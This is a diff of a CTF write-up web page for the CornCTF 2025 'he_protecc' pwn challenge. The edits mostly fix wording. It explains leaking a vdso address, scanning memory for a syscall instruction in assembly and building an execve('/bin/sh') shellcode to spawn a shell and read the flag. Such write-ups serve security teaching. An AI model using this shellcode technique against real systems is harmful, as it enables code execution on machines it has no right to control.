@@ -6,7 +6,7 @@
 </blockquote>
 <h1 id="introduction">Introduction</h1>
 <p>This is the first pwn challenge in the CornCTF 2025.
-Upon inspecting the binary we immediatly notice two things:</p>
+Upon inspecting the binary we immediately notice two things:</p>
 <ol>
 <li><strong>The security mitigations are very relaxed</strong>: the GOT is writable (Partial RELRO) and the code area is not position independent (No PIE) and as such is not randomized.</li>
 <li><strong>The ELF is statically linked</strong>: so we can exclude ret2libc and we have to ignore shenanigans with dynamic libraries this time.</li>
@@ -73,20 +73,20 @@ I was today years old when I learned that I don’t need to manually decode secc
 <h1 id="leak--pwn">Leak &amp; Pwn</h1>
 <p>Here comes the problem, even if the ELF is not PIE, the stack and also <code>vdso</code> still get randomized by <strong>ASLR</strong>, even worse, the internal offsets also get randomized… But let’s tackle one problem after another:</p>
 <h2 id="the-leak">The Leak</h2>
-<p>Using <code>p2p stack vdso</code> we can see 4 leaks on the stack for <strong>vdso</strong>.</p>
+<p>Using <code>p2p stack vdso</code> we can see 4 leaks on the stack for <strong>vdso</strong>, let’s choose the first one.</p>
 <p><img src="/_astro/he_protecc-017.nBq35lx6_ZKlbjN.webp" alt loading="lazy" decoding="async" fetchpriority="auto" width="1074" height="108"></p>
 <h2 id="assembly">Assembly</h2>
-<p>Now comes the <em>difficult</em> part, we can’t calculate the offset between the syscalls and our leak because we cannot guarantee that the internal offsets are constant, we need to scan the memory area…</p>
+<p>Now comes the <em>difficult</em> part, we can’t calculate the offset between the syscalls and our leak because we cannot guarantee that the internal offsets are the same in the remote binary, we need to scan the memory area…</p>
 <p>The first part is easy, let’s take the first leak and put it into a register:</p>
 <pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> r8</span><span style="color:#F8F8F2">, [</span><span style="color:#BD93F9">rbp</span><span style="color:#F8F8F2"> - </span><span style="color:#BD93F9">0x218</span><span style="color:#F8F8F2">]</span></span></code></pre>
-<p>We could zero out the 12 least significant bits to align the address to a page start, but in our case it doesn’t matter.
-Now let’s scan the memory area for a syscall, remember that the opcode is <code>0x0F05</code> but we are in little-endian:</p>
+<p>We could zero out the 12 least significant bits of this leak to align the address to the start of a memory page, but in our case, it’s unnecessary, we already know there are 5 syscall instructions diseminated in the region and it is impossible that they are all contained in the first ‘0x340’ bits of the page.
+Now let’s scan the memory region for a syscall instruction, remember that it’s opcode is <code>0x0F05</code> but we are in little-endian so we need to reverse the order of bits:</p>
 <pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#FF79C6">loop</span><span style="color:#F8F8F2">:</span></span>
 <span class="line"><span style="color:#FF79C6">inc</span><span style="color:#BD93F9"> r8</span></span>
 <span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> ax</span><span style="color:#F8F8F2">, </span><span style="color:#FF79C6">word</span><span style="color:#F8F8F2"> ptr [</span><span style="color:#BD93F9">r8</span><span style="color:#F8F8F2">]</span></span>
-<span class="line"><span style="color:#FF79C6">cmp</span><span style="color:#BD93F9"> ax</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0x050f</span></span>
+<span class="line"><span style="color:#FF79C6">cmp</span><span style="color:#BD93F9"> ax</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0x050f</span><span style="color:#F8F8F2"> &lt;-- </span><span style="color:#FF79C6">syscall</span><span style="color:#F8F8F2"> opcode but reversed</span></span>
 <span class="line"><span style="color:#FF79C6">jne</span><span style="color:#FF79C6"> loop</span></span></code></pre>
-<p>This code snipped increases <code>r8</code> (pointer to <code>vdso</code> leak) and takes two bytes, it then checks if the bytes are equal to the one representing a syscall and if not it loops. If it exits the loop, <code>r8</code> will point to a valid syscall instruction, and we can continue with setting the other registers for an execve call.</p>
+<p>This code snipped increases <code>r8</code> (pointer to <code>vdso</code> leak) and reads two bytes, it then checks if the bytes are equal to the one representing syscall, if not, it continues the loop. If it exits instead, <code>r8</code> will point to a valid syscall instruction, and we can continue with setting the other registers for an execve call.</p>
 <pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> r9</span><span style="color:#F8F8F2">, {u64(b&quot;/bin/sh\</span><span style="color:#BD93F9">0</span><span style="color:#F8F8F2">&quot;)}</span></span>
 <span class="line"><span style="color:#FF79C6">push</span><span style="color:#BD93F9"> r9</span></span>
 <span class="line"></span>
@@ -96,4 +96,4 @@ Now let’s scan the memory area for a syscall, remember that the opcode is <cod
 <span class="line"><span style="color:#FF79C6">xor</span><span style="color:#BD93F9"> rdx</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">rdx</span></span>
 <span class="line"></span>
 <span class="line"><span style="color:#FF79C6">jmp</span><span style="color:#BD93F9"> r8</span><span style="color:#F8F8F2"> // &lt;-- jump to </span><span style="color:#FF79C6">syscall</span><span style="color:#F8F8F2"> outside our mmap area</span></span></code></pre>
-<p>and boom, we have a shell.</p> </article> </main> <footer class="footer" data-astro-cid-sz7xmlte> <div class="footer-content" data-astro-cid-sz7xmlte> <h2 data-astro-cid-sz7xmlte>Contacts</h2> <div class="contact-info" data-astro-cid-sz7xmlte> <p data-astro-cid-sz7xmlte>📧 Email: <a href="mailto:info@pwnissa.it" data-astro-cid-sz7xmlte>info@pwnissa.it</a></p> <p data-astro-cid-sz7xmlte>🐙 GitHub: <a href="https://github.com/pwnissa" target="_blank" data-astro-cid-sz7xmlte>https://github.com/pwnissa</a></p> <p data-astro-cid-sz7xmlte>📍 Università degli Studi di Genova, DIBRIS</p> </div> <p class="made-by" data-astro-cid-sz7xmlte>Made with ♥ by <a href="https://stealthguy.net" target="_blank" rel="noopener noreferrer" data-astro-cid-sz7xmlte>stealthguy</a></p> </div> </footer>  </body></html>
+<p>sending this payload will spawn a shell and with a simple ‘cat flag.txt’ we get the flag!</p> </article> </main> <footer class="footer" data-astro-cid-sz7xmlte> <div class="footer-content" data-astro-cid-sz7xmlte> <h2 data-astro-cid-sz7xmlte>Contacts</h2> <div class="contact-info" data-astro-cid-sz7xmlte> <p data-astro-cid-sz7xmlte>📧 Email: <a href="mailto:info@pwnissa.it" data-astro-cid-sz7xmlte>info@pwnissa.it</a></p> <p data-astro-cid-sz7xmlte>🐙 GitHub: <a href="https://github.com/pwnissa" target="_blank" data-astro-cid-sz7xmlte>https://github.com/pwnissa</a></p> <p data-astro-cid-sz7xmlte>📍 Università degli Studi di Genova, DIBRIS</p> </div> <p class="made-by" data-astro-cid-sz7xmlte>Made with ♥ by <a href="https://stealthguy.net" target="_blank" rel="noopener noreferrer" data-astro-cid-sz7xmlte>stealthguy</a></p> </div> </footer>  </body></html>
